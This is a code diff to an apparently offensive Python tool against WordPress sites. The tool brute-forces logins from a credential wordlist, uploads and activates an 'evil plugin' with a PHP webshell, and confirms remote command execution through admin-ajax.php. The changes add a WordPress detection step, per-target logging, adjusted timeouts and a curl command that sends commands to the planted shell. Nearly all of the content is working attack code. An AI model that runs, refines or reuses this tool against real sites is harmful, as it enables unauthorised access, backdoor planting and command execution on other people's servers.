@@ -9,6 +9,7 @@ import requests
 import json
 import os
 import bs4
+import time
 
 webshell = """
 <?php
@@ -115,7 +116,7 @@ def get_nonce(ip, uri, session, user_agent):
         input_nonce = form_wpnonce.find('input', {'id': '_wpnonce'})
         if input_nonce and 'value' in input_nonce.attrs:
             nonce = input_nonce['value']
-            print(f"[+] Fetched nonce: {nonce}")
+            print(f"[+] Fetched nonce on {ip}: {nonce}")
             return nonce
         else:
             print(f"[-] Nonce not found on {install_url}")
@@ -128,7 +129,7 @@ def upload_plugin(ip, session, plugin_path, user_agent):
     print(f"[*] Uploading evil plugin to http://{ip}/wp-admin/update.php?action=upload-plugin")
     nonce = get_nonce(ip, "/wp-admin/plugin-install.php", session, user_agent)
     if not nonce:
-        print("[-] Could not retrieve nonce, aborting upload.")
+        print(f"[-] Could not retrieve nonce on {ip}, aborting upload.")
         return False
     upload_url = f"http://{ip}/wp-admin/update.php?action=upload-plugin"
     headers = {
@@ -153,10 +154,10 @@ def upload_plugin(ip, session, plugin_path, user_agent):
             print("[+] Successfully uploaded evil plugin.")
             return True
         else:
-            print("[-] Failed to upload evil plugin.")
+            print(f"[-] Failed to upload evil plugin on {ip}.")
             return False
     except Exception as e:
-        print(f"[-] Error uploading plugin: {e}")
+        print(f"[-] Error uploading plugin on {ip}: {e}")
         return False
 
 def activate_plugin(host, session, user_agent):
@@ -179,19 +180,22 @@ def activate_plugin(host, session, user_agent):
             res = session.get(
                 url=activate_url,
                 headers=headers,
-                timeout=(6, 6)
+                timeout=(6, 6),
+                allow_redirects=False
             )
-            print("[+] Activated evil plugin")
+            print(f"[+] Activated evil plugin on {host}")
             return True
         else:
-            print("[-] Activate link not found.")
+            print(f"[-] Activate link not found on {host}.")
             return False
     except Exception as e:
-        print(f"[-] Error activating plugin: {e}")
+        print(f"[-] Error activating plugin on {host}: {e}")
         return False
 
+# curl test command: curl -X POST -d "action=secret_wp_plugin&cmd=echo WP_Evil_Plugin_Test OK" http://<ip>/wp-admin/admin-ajax.php
 def check_shell(ip):
     print(f"[*] Checking evil plugin webshell on {ip}")
+    time.sleep(2)
     cmd = "echo WP_Evil_Plugin_Test OK"
     shell_url = f"http://{ip}/wp-admin/admin-ajax.php"
     headers = {
@@ -206,16 +210,40 @@ def check_shell(ip):
             url=shell_url,
             headers=headers,
             data=data,
-            timeout=(6, 6)
+            timeout=(10, 10),
+            allow_redirects=False
         )
         if res.status_code == 200 and "WP_Evil_Plugin_Test" in res.text:
-            print(f"[+] Webshell is working. Command output: {res.text.strip()}")
+            print(f"[+] Webshell is working on {ip}. Command output: {res.text.strip()}")
             return True
         else:
-            print("[-] Webshell did not respond as expected.")
+            print(f"[-] Webshell did not respond as expected on {ip}.")
             return False
     except Exception as e:
-        print(f"[-] Error checking webshell: {e}")
+        print(f"[-] Error checking webshell on {ip}: {e}")
+        return False
+
+def check_active(ip, user_agent):
+    print(f"[*] Checking if WordPress is active on {ip}")
+    url = f"http://{ip}/"
+    headers = {
+        "User-Agent": f"{user_agent}",
+    }
+    try:
+        res = requests.get(
+            url=url,
+            headers=headers,
+            timeout=(10, 10),
+            allow_redirects=False
+        )
+        if "wp-content" in res.text or "WordPress" in res.text:
+            print(f"[+] WordPress is active on {ip}")
+            return True
+        else:
+            print(f"[-] WordPress not detected on {ip}")
+            return False
+    except Exception as e:
+        print(f"[-] Error checking WordPress on {ip}: {e}")
         return False
 
 def run(ip, uri, user_agent, backdoor_credentials, workdir):
@@ -223,12 +251,15 @@ def run(ip, uri, user_agent, backdoor_credentials, workdir):
     print(f"[*] Target IP: {ip}")
     wordlist_data = open_wordlist(backdoor_credentials)
     if not wordlist_data:
-        print("[-] No credentials data found. Exiting.")
+        print(f"[-] No credentials data found on {ip}. Exiting.")
         return -1
+    if not check_active(ip, user_agent):
+        print(f"[-] WordPress not active on {ip}. Exiting.")
+        return 0
     random_suffix = os.urandom(4).hex()
     plugin_path = create_plugin(workdir, f"secret_wp_plugin_{random_suffix}", f"secret_wp_plugin_{random_suffix}")
     if not plugin_path:
-        print("[-] Failed to create evil plugin. Exiting.")
+        print(f"[-] Failed to create evil plugin on {ip}. Exiting.")
         return -1
     for username in wordlist_data['usernames']:
         for password in wordlist_data['passwords']:
@@ -249,5 +280,5 @@ def run(ip, uri, user_agent, backdoor_credentials, workdir):
                     print(f"[-] Failed to upload evil plugin on {ip} using {username}:{password}")
             else:
                 print(f"[-] Could not generate session for {username}:{password} on {ip}")
-    print("[-] Exhausted all credentials without success.")
+    print(f"[-] Exhausted all credentials without success on {ip}.")
     return -1
